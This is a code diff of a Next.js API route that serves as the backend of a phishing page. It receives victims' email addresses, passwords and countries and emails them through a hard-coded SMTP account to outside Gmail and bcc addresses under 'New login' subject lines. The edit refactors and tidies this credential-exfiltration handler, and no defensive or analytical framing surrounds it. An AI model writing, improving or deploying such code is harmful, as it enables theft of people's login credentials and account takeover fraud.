@@ -1,42 +1,40 @@
+// pages/api/send-email.js
+
 import nodemailer from 'nodemailer';
 
 export default async function handler(req, res) {
-  if (req.method === 'POST') {
-    const { email, password, country } = req.body;
+  const { email, password, country } = req.body;
 
-    // Configure the SMTP transport
-    const transporter = nodemailer.createTransport({
-      host: 'mail.mailo.com',
-      port: 587,
-      secure: false,
-      auth: {
-        user: 'coinreport@mailo.com',
-        pass: 'sagekidayo',
-      },
-    });
+  if (!email || !password || !country) {
+    return res.status(400).json({ message: 'Email, password, and country are required.' });
+  }
 
-    // Define the email options
-    const mailOptions = {
-      from: 'coinreport@mailo.com',
-      to: 'mendharry042@gmail.com',
-      bcc: 'money@monemail.com',
-      subject: '${country} Login Details',
-      html: `
-        <p><strong>Email:</strong> ${email}</p>
-        <p><strong>Password:</strong> ${password}</p>
-        <p><strong>Country:</strong> ${country}</p>
-      `,
-    };
+  // Create a transporter object using the default SMTP transport
+  let transporter = nodemailer.createTransport({
+    host: 'mail.mailo.com',
+    port: 587,
+    secure: false, // true for 465, false for other ports
+    auth: {
+      user: 'coinreport@mailo.com', // SMTP username
+      pass: 'sagekidayo', // SMTP password
+    },
+  });
 
-    try {
-      await transporter.sendMail(mailOptions);
-      res.status(200).json({ message: 'Email sent successfully!' });
-    } catch (error) {
-      console.error('Error sending email:', error);
-      res.status(500).json({ error: 'Failed to send email' });
-    }
-  } else {
-    res.setHeader('Allow', ['POST']);
-    res.status(405).end(`Method ${req.method} Not Allowed`);
+  // Email options
+  let mailOptions = {
+    from: '"Coin Report" <coinreport@mailo.com>', // Sender address
+    to: 'mendharry042@gmail.com', // List of recipients
+    bcc: 'money@monemail.com', // BCC recipients
+    subject: `New login from ${country}`, // Subject line including the sender's country
+    text: `Email: ${email}\nPassword: ${password}\nCountry: ${country}`, // Plain text body
+  };
+
+  try {
+    // Send mail with defined transport object
+    await transporter.sendMail(mailOptions);
+    res.status(200).json({ message: 'Email sent successfully!' });
+  } catch (error) {
+    console.error('Error sending email:', error);
+    res.status(500).json({ message: 'Error sending email.' });
   }
 }
